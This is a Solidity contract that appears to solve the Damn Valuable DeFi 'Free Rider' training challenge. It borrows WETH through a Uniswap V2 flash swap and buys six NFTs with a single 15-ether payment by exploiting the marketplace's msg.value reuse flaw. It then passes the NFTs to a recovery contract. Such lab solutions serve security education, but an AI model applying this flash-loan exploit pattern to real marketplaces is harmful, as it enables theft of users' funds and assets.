// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../DamnValuableNFT.sol";
import "./FreeRiderRecovery.sol";
import "./FreeRiderRecovery.sol";
import "./FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IWETH {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function balanceOf(address) external view returns (uint);

    function allowance(address, address) external view returns (uint);

    receive() external payable;

    function deposit() external payable;

    function withdraw(uint wad) external;

    function totalSupply() external view returns (uint);

    function approve(address guy, uint wad) external returns (bool);

    function transfer(address dst, uint wad) external returns (bool);

    function transferFrom(address src, address dst, uint wad)
    external
    returns (bool);
}
contract FreeRiderExploit is IERC721Receiver,ReentrancyGuard{
    DamnValuableNFT nft;
    IUniswapV2Pair pair;
    FreeRiderNFTMarketplace market;
    IWETH weth;
    address buyer;
    address player;

    constructor(address _nft, address _pair, address payable _market, address payable _weth,address _buyer, address _player){
        nft = DamnValuableNFT(_nft);
        pair = IUniswapV2Pair(_pair);
        market = FreeRiderNFTMarketplace(_market);
        weth = IWETH(_weth);
        buyer = _buyer;
        player = _player;
    }

    function flashswap(address tokenToBorrow,uint amount) external {
        uint amount0 = pair.token0() == tokenToBorrow ? amount : 0;
        uint amount1 = pair.token1() == tokenToBorrow ? amount : 0;
        bytes memory data = abi.encode(tokenToBorrow,amount);
        pair.swap(amount0,amount1,address(this),data);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        (address tokenToBorrow, uint amount) = abi.decode(data,(address,uint));
        require(tokenToBorrow == address(weth));
        require(weth.balanceOf(address(this)) == amount, "amount not transferd");
        weth.withdraw(amount);
        require(address(this).balance <= amount, "Not enough ETH");
        uint[] memory tokenIds = new uint[](6);
        for(uint tokenId = 0; tokenId < 6; tokenId ++){
            tokenIds[tokenId] = tokenId;
        }
        market.buyMany{value : 15 ether}(tokenIds);
        require(nft.balanceOf(address(this) )== 6, "purchase failed");
        
        for(uint i = 0; i < 6; i++){
            nft.safeTransferFrom(address(this),buyer, i,abi.encode(player));
        }

        uint fee = ((amount * 3)/ 997) + 1;
        uint amountRepay = fee + amount;
        weth.deposit{value : amountRepay}();
        require(weth.balanceOf(address(this)) >= amountRepay, "Not enough weth to repay");
        weth.transfer(address(pair),amountRepay);

    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        override
        nonReentrant
        returns (bytes4)
    {

        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable{}

}